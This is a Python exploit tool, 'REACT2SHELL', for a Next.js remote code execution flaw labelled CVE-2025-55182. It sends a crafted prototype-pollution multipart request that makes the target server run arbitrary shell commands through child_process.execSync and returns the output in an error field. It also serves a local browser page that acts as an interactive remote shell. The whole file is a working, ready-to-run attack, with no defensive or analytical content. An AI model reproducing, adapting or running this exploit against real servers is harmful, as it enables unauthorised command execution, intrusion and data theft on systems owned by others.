# REACT2SHELL - Next.js RCE Exploit CVE-2025-55182

import requests
import sys
import json
import argparse
import logging
import http.server
import socketserver
import threading
import urllib.parse
import time # Added for execution delay tracking

# --- CONFIGURATION ---
logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

# Global variable to hold the reference to the core RCE function
global_rce_function = None

# --- HTML TEMPLATE FOR CYBERPUNK CLI (Unchanged for visual design) ---
CYBERPUNK_HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title> REACT2SHELL CVE-2025-55182</title>
    <style>
        body {{ 
            background: #000; color: #00ff41; font-family: 'Hack', 'Courier New', monospace;
            display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;
            overflow: hidden;
            /* Cyberpunk Grid Effect */
            background-image: linear-gradient(0deg, #111 1px, transparent 1px),
                              linear-gradient(90deg, #111 1px, transparent 1px);
            background-size: 50px 50px;
        }}
        #console {{
            width: 800px; height: 600px; background: rgba(0, 0, 0, 0.8);
            border: 2px solid #00ff41; box-shadow: 0 0 10px #00ff41, 0 0 5px #00ff41 inset;
            padding: 15px; box-sizing: border-box; display: flex; flex-direction: column;
            animation: flicker 1.5s infinite alternate;
        }}
        #output {{
            flex-grow: 1; overflow-y: auto; white-space: pre-wrap; margin-bottom: 10px;
            text-shadow: 0 0 5px #00ff41; 
        }}
        #input-line {{
            display: flex; color: #ff00ff;
        }}
        #prompt {{
            color: #00ffff; margin-right: 8px; text-shadow: 0 0 5px #00ffff;
        }}
        #command-input {{
            flex-grow: 1; background: transparent; border: none; color: #ff00ff;
            outline: none; font-family: inherit; font-size: inherit; caret-color: #ff00ff;
            text-shadow: 0 0 5px #ff00ff;
        }}
        @keyframes flicker {{
            0% {{ opacity: 1; }}
            50% {{ opacity: 0.98; }}
            100% {{ opacity: 1; }}
        }}
    </style>
</head>
<body>
    <div id="console">
        <div id="output">
            <span style="color: #ff00ff;">>>> REACT2SHELL but cooler</span><br>
            <span style="color: #ff00ff;">>>> TARGET: {target_url}</span><br>
            <span style="color: #00ffff;">>>> RCE Confirmed: Non-Interactive Shell Ready.</span><br>
        </div>
        <div id="input-line">
            <span id="prompt">[[SYSTEM@RCE]]></span>
            <input type="text" id="command-input" autofocus>
        </div>
    </div>
    
    <script>
        const output = document.getElementById('output');
        const input = document.getElementById('command-input');
        const target_url = "{target_url}";

        input.addEventListener('keydown', function(event) {{
            if (event.key === 'Enter') {{
                const command = input.value.trim();
                input.value = '';
                
                if (command === 'clear') {{
                    output.innerHTML = '';
                    return;
                }}
                
                // Print command to output
                output.innerHTML += `<span style="color: #00ffff;">[[SYSTEM@RCE]]>${{command}}</span><br>`;
                output.scrollTop = output.scrollHeight;

                // Send command to the Python backend
                if (command) {{
                    output.innerHTML += `<span style="color: yellow;">[STATUS] Executing command...</span><br>`;
                    output.scrollTop = output.scrollHeight;

                    fetch(`/run_cmd?cmd=${{encodeURIComponent(command)}}&url=${{encodeURIComponent(target_url)}}`)
                        .then(response => response.text())
                        .then(data => {{
                            // Display the raw output from the server
                            output.innerHTML += `<span style="color: #00ffff;">[STATUS] Execution complete.</span><br>`;
                            output.innerHTML += data + '<br>';
                            output.scrollTop = output.scrollHeight;
                        }})
                        .catch(error => {{
                            output.innerHTML += `<span style="color: #ff0000;">[ERROR] Connection failed: ${{error}}</span><br>`;
                            output.scrollTop = output.scrollHeight;
                        }});
                }}
            }}
        }});
    </script>
</body>
</html>
"""

# --- WEB SERVER AND HANDLER LOGIC ---

class CyberpunkCLIHandler(http.server.SimpleHTTPRequestHandler):
    """Handles HTTP requests for the local interactive shell."""
    
    def do_GET(self):
        parsed_url = urllib.parse.urlparse(self.path)
        
        if parsed_url.path == '/':
            # Serve the main HTML page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html_content = CYBERPUNK_HTML_TEMPLATE.format(target_url=self.server.target_url)
            self.wfile.write(html_content.encode())
            return
            
        elif parsed_url.path == '/run_cmd':
            # Handle the AJAX command request from the browser
            query_params = urllib.parse.parse_qs(parsed_url.query)
            cmd = query_params.get('cmd', [''])[0]
            target_url = query_params.get('url', [''])[0]
            
            if global_rce_function and cmd:
                # Execute the RCE using the core function
                output = global_rce_function(target_url, cmd)
                
                self.send_response(200)
                self.send_header('Content-type', 'text/plain')
                self.end_headers()
                self.wfile.write(output.encode('utf-8'))
                return
            
            self.send_error(500, "RCE function not linked or command missing.")
            return

class ThreadingHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    """Multi-threaded HTTP Server for responsiveness."""
    pass

def start_cli_server(target_url, rce_core_function, host='127.0.0.1', port=8000):
    """Starts the local web server and links the RCE function."""
    
    global global_rce_function
    global_rce_function = rce_core_function
    
    server_address = (host, port)
    httpd = ThreadingHTTPServer(server_address, CyberpunkCLIHandler)
    httpd.target_url = target_url
    
    server_thread = threading.Thread(target=httpd.serve_forever)
    server_thread.daemon = True 
    server_thread.start()
    
    logging.critical(f"Cyberpunk CLI Server running on http://{host}:{port}")

# --- CORE RCE LOGIC (Non-Interactive Command Execution) ---

def run_non_interactive_cmd(target_url, command):
    """
    Executes a single command on the target via RCE and returns the output string.
    
    HOW IT WORKS: The payload pollutes the '__proto__' of an object in a way that
    causes the server to execute the injected code (prefix) before a file upload
    completes. The executed command then forces an error to print its output
    into the 'digest' field of the error response, allowing retrieval.
    """
    
    # Payload executes command synchronously and injects output into the error response
    prefix = (
        f"var res = process.mainModule.require('child_process').execSync('{command}',"
        f"{{'timeout':5000}}).toString().trim(); "
        f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"
    )
    
    crafted_chunk = {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then": "$B0"}',
        "_response": {
            "_prefix": prefix,
            "_formData": {
                "get": "$1:constructor:constructor",
            },
        },
    }

    files = {
        "0": (None, json.dumps(crafted_chunk)),
        "1": (None, '"$@0"'),
    }

    headers = {"Next-Action": "x"}
    start_time = time.time()

    try:
        res = requests.post(target_url, files=files, headers=headers, timeout=5)
        
        # Check if the execution output was captured in the error field
        if 'digest' in res.text:
            end_time = time.time()
            # Extract output from the special 'digest' field
            start = res.text.find('{"digest":"') + 11
            end = res.text.find('"}', start)
            output = res.text[start:end]
            
            # Clean up escape sequences for display
            cleaned_output = output.replace('\\n', '\n').replace('\\t', '\t')
            
            return f"[INFO] Execution Time: {end_time - start_time:.2f}s (Status: {res.status_code})\n{cleaned_output}"
        
        return f"[ERROR] Execution failed (Status: {res.status_code}). Output not captured."

    except requests.exceptions.Timeout:
        return "[ERROR] Request timed out. Target did not respond in time."
    except requests.exceptions.RequestException as e:
        return f"[ERROR] Connection error: {e}"


# --- MAIN EXECUTION BLOCK ---

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="REACT2SHELL - Next.js Prototype Pollution RCE Exploit Tool.",
        epilog="""
Usage Examples:
  1. Interactive Web Shell: python3 exploit.py http://target:56273 --web-cli
  2. Non-Interactive Command: python3 exploit.py http://target:56273 --cmd 'whoami'
"""
    )
    
    parser.add_argument("target_url", help="Full URL of the vulnerable server (e.g., http://target:56273).")
    
    # Argument for web CLI mode
    parser.add_argument("--web-cli", action="store_true", help="Launch the local Cyberpunk Web CLI for interactive commands.")
    
    # Argument for a single command run
    group_cmd = parser.add_argument_group('Command Execution Options')
    group_cmd.add_argument("--cmd", default="id", help="Command to execute and retrieve output (default: 'id').")
    
    args = parser.parse_args()
    
    if not args.target_url.startswith('http'):
        args.target_url = 'http://' + args.target_url

    if args.web_cli:
        # Launch the local server and enter a waiting loop
        start_cli_server(args.target_url, run_non_interactive_cmd)
        
        try:
            print("\nPress Ctrl+C to stop the Web CLI server.")
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\nCyberpunk CLI Server stopped.")
            sys.exit(0)
            
    else:
        # Run in standard non-interactive command mode
        print(f"[*] Executing command: {args.cmd}")
        output = run_non_interactive_cmd(args.target_url, args.cmd)
        
        print("\n" + "=" * 20 + " COMMAND OUTPUT " + "=" * 20)
        print(output)
        print("=" * 56 + "\n")